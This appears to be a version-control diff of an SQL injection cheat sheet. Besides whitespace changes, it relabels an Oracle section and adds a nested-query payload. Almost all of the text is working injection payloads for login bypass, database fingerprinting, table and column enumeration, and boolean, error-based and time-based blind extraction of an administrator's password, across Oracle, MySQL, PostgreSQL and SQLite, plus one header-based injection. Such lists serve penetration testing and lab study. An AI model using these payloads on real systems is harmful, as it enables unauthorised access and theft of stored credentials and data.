@@ -5,7 +5,6 @@
 1' or 1=1-- - >> Input box string.
 
 
-
 #Determining column numbers
 
 ' order by 1-- -
@@ -19,11 +18,9 @@ union select null, null >> Without quote in vulnerable parameter
 and 1=2 union select null, null >> Without quote in vulnerable parameter
 
 
-
 #To find a column containing strings
 
 ' union select null, 'null', null-- -
-
 
 
 #To identify vulnerable columns
@@ -35,7 +32,6 @@ union select 1,2,3,4 >> Without quote in vulnerable parameter
 and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 
 
-
 #To fetch database version
 
 ' union select banner, null from v$version-- - >> Oracle
@@ -45,7 +41,6 @@ and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 ' union select null, version()-- - >> PostgreSQL
 
 ' union select null, sqlite_version()-- - >> SQLite
-
 
 
 #SQLite Database info retrieving
@@ -61,15 +56,13 @@ and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 (SELECT group_concat(column1 || "," || column2 || "," || column3 || ":") from [table name here]) >> To retrieve multiple columns data. 
 
 
-
-#PostgreSQL Database info retrieving
+#Oracle Database info retrieving
 
 ' union SELECT table_name,null FROM all_tables-- -
 
 ' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - 
 
 ' union select [column name here],null from [table name here]-- - 
-
 
 
 #PostgreSQL Database info retrieving
@@ -79,7 +72,6 @@ and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 ' union SELECT column_name,null FROM information_schema.columns WHERE table_name='[table name]'-- -
 
 ' union select [column name here],null from [table name here]-- -
-
 
 
 #Mysql Database info retrieving
@@ -97,7 +89,6 @@ and 1=2 union SELECT null,null,column_name,null FROM information_schema.columns 
 and 1=2 union select null,null,[column name here],null from [table name here]
 
 
-
 #Blind based Boolean SQL injection with conditional responses (Visible message)
 
 ' and (select 'x' from users LIMIT 1)='x'-- - >> To determine if the [users] table is exist or not.
@@ -109,13 +100,11 @@ and 1=2 union select null,null,[column name here],null from [table name here]
 ' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- -
 
 
-
 #Blind SQL injection with conditional errors (No visible message)
 
 ' || (select ' ') || ' >> Non Oracle
 
 ' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.
-
 
 
 #Blind SQL injection with conditional errors to determine a table, other info exist or not
@@ -129,7 +118,6 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and SUBSTRING(password,1,1)='a' >> Oracle #500 error means exists.
 
 
-
 #Blind SQL injection with time delays
 
 ' UNION SELECT SLEEP(5);-- -
@@ -141,7 +129,6 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 ' ||  (SELECT pg_sleep(10))-- - >> PostgreSQL
 
 ' ||  (SELECT SLEEP(10))-- - >> MySQL
-
 
 
 #Blind SQL injection with time delays and information retrieval
@@ -159,7 +146,6 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 ';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users--
 
 
-
 #Visible Error-Based Sql Injection
 
 '||cast((select version() LIMIT 1) AS INT)--
@@ -173,3 +159,7 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 
 x-forwarded-for: 127.0.0.1' union select 1,2,3 and sleep(2)-- -
 
+
+#Inception based SQLi
+
+and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
